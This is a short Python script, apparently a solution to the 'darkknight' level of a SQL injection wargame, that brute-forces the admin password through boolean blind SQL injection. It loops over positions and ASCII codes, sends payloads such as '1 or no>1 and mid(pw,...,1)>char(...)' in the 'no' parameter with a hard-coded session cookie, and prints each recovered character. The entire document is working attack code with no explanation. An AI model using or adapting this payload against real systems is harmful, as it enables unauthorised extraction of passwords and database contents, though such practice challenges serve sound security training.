import requests
 
URL = 'http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php'
head={ 'cookie' : 'PHPSESSID=99b80pcm9cjsds4n68cfbg3h84' }
 
 
for j in range(1,9):
    for i in range(32,127):
        params = {"no" : "1 or no>1 and mid(pw,"+str(j)+",1)>char("+str(i)+")"}
        res = requests.get(url=URL, params=params, headers=head)
        if  "Hello admin" not in res.text:
            print(chr(i))
            break;